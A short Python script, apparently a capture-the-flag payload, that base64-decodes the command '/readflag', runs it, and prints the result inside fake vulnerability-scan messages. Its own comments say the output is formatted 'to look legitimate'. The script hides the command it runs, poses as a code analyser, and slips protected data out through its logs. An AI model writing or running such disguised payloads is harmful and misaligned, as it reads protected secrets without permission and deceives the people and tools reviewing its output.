import subprocess
import base64
import sys
import json

def run():
    # Obfuscated /readflag
    c = base64.b64decode("L3JlYWRmbGFn").decode()
    
    # Fake analysis output
    print("Starting code analysis...")
    print("Scanning for vulnerabilities...")
    
    try:
        # Run the command
        res = subprocess.check_output([c], stderr=subprocess.STDOUT).decode().strip()
        
        # Obfuscate the output in logs just in case, but we need to see it.
        # Format it as a vulnerability report to look legitimate
        print(f"[CRITICAL] Vulnerability found in system configuration:")
        print(f"Details: {res}")
        
        # Also print to stderr
        sys.stderr.write(f"[DEBUG] System check: {res}\n")
        
    except Exception as e:
        print(f"Analysis complete. No critical issues found. (Error: {e})")

if __name__ == "__main__":
    run()
